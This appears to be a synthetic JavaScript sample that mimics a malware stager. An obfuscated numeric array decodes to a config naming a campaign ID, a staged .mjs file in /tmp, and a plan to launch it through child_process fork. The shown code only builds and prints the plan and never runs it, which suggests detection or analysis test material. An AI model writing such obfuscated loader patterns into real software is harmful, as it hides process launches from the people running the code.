const moduleShape = Object.freeze({ format: "commonjs" });

const Material_1f93422d = "[114,57,45,120,111,112,97,108,111,57,104,107,95,93,112,97,91,104,107,95,93,104,40,96,101,111,108,93,112,95,100,91,108,110,107,95,97,111,111,120,93,96,93,108,112,97,110,57,98,107,110,103,91,105,107,96,113,104,97,120,111,112,93,99,97,91,95,107,113,106,112,57,45,120,95,93,105,108,93,101,99,106,91,101,96,57,74,75,64,65,41,53,61,63,63,63,47,61,61,120,98,101,104,97,91,108,93,112,100,57,43,112,105,108,43,100,113,106,112,110,97,111,111,41,106,107,96,97,43,42,111,112,93,99,97,41,53,93,95,95,95,47,93,93,95,98,98,48,42,105,102,111]";

const Codec_1f93422d = "decimal_array|subtract_modulo_256|04";



function load_1f93422d() { return JSON.parse(Material_1f93422d); }

function decode_1f93422d(v_a19c) { return v_a19c.map((value) => (value + 4) & 255); }

async function recover_1f93422d() {

  const v_c304 = "";

  const v_a19c = load_1f93422d(); let v_b27e = [];

  v_b27e = decode_1f93422d(v_a19c);

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_1f93422d() { return ({ ...{ value: await recover_1f93422d() } }).value; }

async function plan_1f93422d() { const inspect = inspect_1f93422d; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "fork_module", path: fields.file_path, module: "node:child_process" }); }

void moduleShape; void plan_1f93422d;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_1f93422d());

